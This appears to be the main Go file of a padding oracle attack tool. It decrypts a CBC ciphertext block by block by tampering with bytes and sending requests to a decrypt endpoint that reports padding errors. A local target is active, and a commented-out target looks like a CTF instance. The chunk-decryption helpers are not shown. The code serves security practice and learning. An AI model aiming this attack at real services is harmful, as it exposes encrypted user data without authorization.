package main

import (
	"fmt"
	"os"

	"github.com/mattn/go-isatty"
)

const blockLen = 16

var parallel = 100

var baseURL = "http://localhost:5000/decrypt?cipher=%s"
var cipherEncoded = "jigNcuWcyzd8QB7E/fm7peYSX9gnh6/gYG5Hmy/Bz7IVHVUM1hFyoCjPREV5efzK"
var paddingError = "IncorrectPadding"

// var baseURL = "http://35.227.24.107/7631b88aa5/?post=%s"
// var cipherEncoded = "SqSdDHQt0u3b3Hmzklmd2oom2AjfJ8gmwir8PPXBXy6ybHE1o3KRleVxELoZAu-7MiAJGNCV075GhBsdokAFm0JLMA9XHJ4SLCIRU7K!6HktXt!y9rD4MEf6kvzxftlt35jGUuqL3t0RwSJjcMC-7eQuN9aFue5p9kqA7MlQSUiSD0J9Id8mCqsbwLXGohGS5w53EJz9jX6-g1vkS3lDiA~~"
// var paddingError = "PaddingException"

func main() {
	Logo()
	createStatus()
	plain, err := decipher(cipherEncoded)
	if err != nil {
		currentStatus.error(err)
	}

	if !isatty.IsTerminal(os.Stdout.Fd()) {
		os.Stdout.Write(plain)
	}
}

func decipher(cipherEncoded string) ([]byte, error) {
	// we refer to current status
	status := currentStatus

	/* usually we are given an initial, valid cipher, tampering on which, we discover the plaintext
	we decode it into bytes, so we can tamper it at that byte level */
	cipher, err := decode(cipherEncoded)
	if err != nil {
		return nil, err
	}

	/* we need to check that overall cipher length complies with blockLen
	as this is crucial to further logic */
	if len(cipher)%blockLen != 0 {
		status.error(fmt.Errorf("Cipher len is bad"))
	}
	blockCount := len(cipher)/blockLen - 1

	/* now, we gonna tamper at every block separately,
	thus we need to split up the whole payload into blockSize*2 sized chunks
	- first half - the bytes we gonna tamper on
	- second half - the bytes that will produce the padding error */
	cipherChunks := make([][]byte, blockCount)
	for i := 0; i < blockCount; i++ {
		cipherChunks[i] = make([]byte, blockLen*2)
		copy(cipherChunks[i], cipher[i*blockLen:(i+2)*blockLen])
	}

	// create container for a final plaintext
	plainText := make([]byte, len(cipher)-blockLen)

	// init new status bar
	status.startStatusBar(len(plainText))

	// decode every cipher chunk and fill-in the relevant plaintext positions
	// we move backwards through chunks, though it really doesn't matter
	for i := len(cipherChunks) - 1; i >= 0; i-- {
		plainChunk, err := decipherChunk(cipherChunks[i])
		if err != nil {
			return nil, err
		}
		copy(plainText[i*16:(i+1)*16], plainChunk)
	}

	// that's it!
	status.finishStatusBar()
	return plainText, nil
}
